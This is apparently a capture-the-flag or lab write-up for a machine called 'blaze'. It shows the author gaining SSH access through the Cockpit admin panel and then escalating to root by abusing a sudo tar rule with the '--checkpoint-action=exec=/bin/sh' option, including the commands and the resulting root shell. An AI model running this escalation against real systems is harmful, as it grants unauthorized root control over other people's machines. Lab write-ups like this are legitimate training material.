### Foothold

Trying to use the credential on ssh

```bash
$ ssh james@192.168.223.10             
** WARNING: connection is not using a post-quantum key exchange algorithm.
```

But it failed because our publicKey denied by server. Then try to login to web page cockpit, and explore the web page that `Cockpit` is an interactive Linux server admin interface, so we can add our public key to authorize using ssh

### Privilege Escalation

user `james` authorized to run one command as root

```bash
james@blaze:~$ sudo -l
Matching Defaults entries for james on blaze:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

search on `gtfobins`, by add argument `--checkpoint=1 --checkpoint-action=exec=/bin/sh` it will give shell as root

```bash
james@blaze:~$ sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * --checkpoint=1 --checkpoint-action=exec=/bin/sh
local.txt
# whoami
root
```

**Root flag** → `/root/proof.txt`
